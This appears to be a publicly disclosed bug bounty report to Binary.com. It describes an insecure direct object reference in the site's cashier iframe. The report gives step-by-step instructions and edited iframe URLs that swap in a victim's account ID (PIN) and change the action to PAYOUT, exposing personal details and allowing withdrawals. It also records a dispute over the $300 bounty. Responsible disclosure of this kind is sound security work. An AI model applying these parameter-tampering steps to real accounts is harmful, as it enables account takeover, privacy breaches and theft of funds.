title: login to any user's cashier account and full account information disclosure

profile.name: Binary.com
profile.about: Binary.com is the leading binary options website, founded in 1999.

vulnerability_information:
Hi , I have found an  issue allowing an attacker to login to any user's cashier account and view sensitive user information by just knowing the user account ID.
#Steps to reproduce:
1. open 2 browsers and create 2 accounts , login with each account on a browser.
2. let's call account 1 , the victim and account 2 is the attacker.
3. from the victim account , make sure you are using real account and then go to https://www.binary.com/cashier then click **Deposit** then click **Continue**. 

4. From the attacker account go to https://www.binary.com/cashier then click **Deposit** then click **Continue**. 
5. Now you'll see your cashier account , inspect the page elements using your browser inspector then find the `<iframe>` tag with the id attribute **cashiercont**. it will look like this : 

```
<iframe src="https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&PIN=CR342435&Lang=en&Password=0e552ae717a1d08cb147f132a31676559e3273ef&Secret=1328d47abeda2b672b6424093c4dbc76&Action=DEPOSIT" frameborder="0" width="100%" height="2000" id="cashiercont" scrolling="auto" style="padding:0px;margin:0px;"></iframe>
```
6. Edit the `<iframe>` element and Change the `PIN` parameter value to the victim account id value  so it should be like this after the edit:

```
<iframe src="https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&PIN=<VICTIM_ACCOUNT_ID>&Lang=en&Password=0e552ae717a1d08cb147f132a31676559e3273ef&Secret=1328d47abeda2b672b6424093c4dbc76&Action=DEPOSIT" frameborder="0" width="100%" height="2000" id="cashiercont" scrolling="auto" style="padding:0px;margin:0px;"></iframe>
```
7. Now you have successfully logged in the victim's cashier account , to view the victim account details , click the **cashier** button then next to the **customer name** click the _view_ link and you'll see all the account details of the victim , including _Full name_ , _email_ and _phone number_ which are the most sensitive here since they can be used in phishing.

Please tell me if you are having any issue reproducing this.
Thanks
vulnerability_information_html:
Hi , I have found an issue allowing an attacker to login to any user's cashier account and view sensitive user information by just knowing the user account ID.

Steps to reproduce:

  1. open 2 browsers and create 2 accounts , login with each account on a browser.
  2. let's call account 1 , the victim and account 2 is the attacker.

  3. from the victim account , make sure you are using real account and then go to https://www.binary.com/cashier then click Deposit then click Continue.

  4. From the attacker account go to https://www.binary.com/cashier then click Deposit then click Continue.

  5. Now you'll see your cashier account , inspect the page elements using your browser inspector then find the <iframe> tag with the id attribute cashiercont. it will look like this : 

<iframe src="https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&PIN=CR342435&Lang=en&Password=0e552ae717a1d08cb147f132a31676559e3273ef&Secret=1328d47abeda2b672b6424093c4dbc76&Action=DEPOSIT" frameborder="0" width="100%" height="2000" id="cashiercont" scrolling="auto" style="padding:0px;margin:0px;"></iframe>
  1. Edit the <iframe> element and Change the PIN parameter value to the victim account id value so it should be like this after the edit:
<iframe src="https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&PIN=<VICTIM_ACCOUNT_ID>&Lang=en&Password=0e552ae717a1d08cb147f132a31676559e3273ef&Secret=1328d47abeda2b672b6424093c4dbc76&Action=DEPOSIT" frameborder="0" width="100%" height="2000" id="cashiercont" scrolling="auto" style="padding:0px;margin:0px;"></iframe>
  1. Now you have successfully logged in the victim's cashier account , to view the victim account details , click the cashier button then next to the customer name click the view link and you'll see all the account details of the victim , including Full name , email and phone number which are the most sensitive here since they can be used in phishing.

Please tell me if you are having any issue reproducing this.
Thanks

activities.message:
Hi , I have just realized that this is really severe , since it can be used to withdraw money from any user's account to the attacker's account!!!
Which means stealing money from user's without any interaction from them!
This is really severe!!!
activities.markdown_message:
Hi , I have just realized that this is really severe , since it can be used to withdraw money from any user's account to the attacker's account!!!
Which means stealing money from user's without any interaction from them!
This is really severe!!!

activities.message: to withdraw money from the victim account , in step 3 and 4 , instead of clicking  **Deposit** , click  **withdraw**
activities.markdown_message: to withdraw money from the victim account , in step 3 and 4 , instead of clicking Deposit , click withdraw

activities.message:
Here is how this can be used to withdraw money from any user's account to the attacker's skrill , credit card ..etc 
#Steps to reproduce:
1. go to https://www.binary.com/cashier then click Deposit then click Continue.
2. inspect elements in the page and find the <iframe> element displaying the cashier account and it will look like this : 

```
<iframe src="https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&PIN=CR342435&Lang=en&Password=0e552ae717a1d08cb147f132a31676559e3273ef&Secret=1328d47abeda2b672b6424093c4dbc76&Action=DEPOSIT" frameborder="0" width="100%" height="2000" id="cashiercont" scrolling="auto" style="padding:0px;margin:0px;"></iframe>
```
3. in the value of the **src** attribute of the `<iframe>` tag change the **PIN** parameter value to the victim account ID and change the **Action** parameter value to PAYOUT
so it will look like this after the edit:

```
<iframe src="https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&PIN=<VICTIM_ACCOUNT_ID>&Lang=en&Password=0e552ae717a1d08cb147f132a31676559e3273ef&Secret=1328d47abeda2b672b6424093c4dbc76&Action=PAYOUT" frameborder="0" width="100%" height="2000" id="cashiercont" scrolling="auto" style="padding:0px;margin:0px;"></iframe>
```

Now you'll be able to withdraw money from the victim's account to any place you want!!!

Please tell me if you are having an issue reproducing this , i can send you a PoC video.
Thanks
activities.markdown_message:
Here is how this can be used to withdraw money from any user's account to the attacker's skrill , credit card ..etc

Steps to reproduce:

  1. go to https://www.binary.com/cashier then click Deposit then click Continue.
  2. inspect elements in the page and find the <iframe> element displaying the cashier account and it will look like this : 
<iframe src="https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&PIN=CR342435&Lang=en&Password=0e552ae717a1d08cb147f132a31676559e3273ef&Secret=1328d47abeda2b672b6424093c4dbc76&Action=DEPOSIT" frameborder="0" width="100%" height="2000" id="cashiercont" scrolling="auto" style="padding:0px;margin:0px;"></iframe>
  1. in the value of the src attribute of the <iframe> tag change the PIN parameter value to the victim account ID and change the Action parameter value to PAYOUT so it will look like this after the edit:
<iframe src="https://cashier.binary.com/login.asp?Sportsbook=Binary (CR) SA USD&PIN=<VICTIM_ACCOUNT_ID>&Lang=en&Password=0e552ae717a1d08cb147f132a31676559e3273ef&Secret=1328d47abeda2b672b6424093c4dbc76&Action=PAYOUT" frameborder="0" width="100%" height="2000" id="cashiercont" scrolling="auto" style="padding:0px;margin:0px;"></iframe>

Now you'll be able to withdraw money from the victim's account to any place you want!!!

Please tell me if you are having an issue reproducing this , i can send you a PoC video.
Thanks

activities.message:
Hi , thank you for the bounty  ,although I am not happy with it.
This bug could cause a lot of money being stolen easily from your website. An attacker could withdraw any amount of money from any user's account to his credit card , skrill ..etc without any interaction from the victim. 
I am really disappointed.
with any other program even smaller ones I'm pretty sure that I would get much more than $300 for a much more trivial vulnerability than this!!
I respect your decision , but I think it deserves more.
Thanks.

Hi , thank you for the bounty ,although I am not happy with it.
This bug could cause a lot of money being stolen easily from your website. An attacker could withdraw any amount of money from any user's account to his credit card , skrill ..etc without any interaction from the victim.
I am really disappointed.
with any other program even smaller ones I'm pretty sure that I would get much more than $300 for a much more trivial vulnerability than this!!

activities.message: @zombiehelp54 The reason we don't see it as critical as you do because our withdrawal needs to go through manual human review for approval. So suspicious withdrawal like to a different card holder name will not pass that stage. Thanks again for the report :)
activities.markdown_message: @zombiehelp54 The reason we don't see it as critical as you do because our withdrawal needs to go through manual human review for approval. So suspicious withdrawal like to a different card holder name will not pass that stage. Thanks again for the report :)

activities.message: No worries , can we make this public ?
activities.markdown_message: No worries , can we make this public ?

summaries.content:
This bug allowed an attacker to login to any user's cachier account , view the user full account details and withdraw money from the user's account to the attacker's credit card , skrill ..etc.
http://zombiehelp54.blogspot.com/2015/11/binarycom-critical-vulnerability-to.html
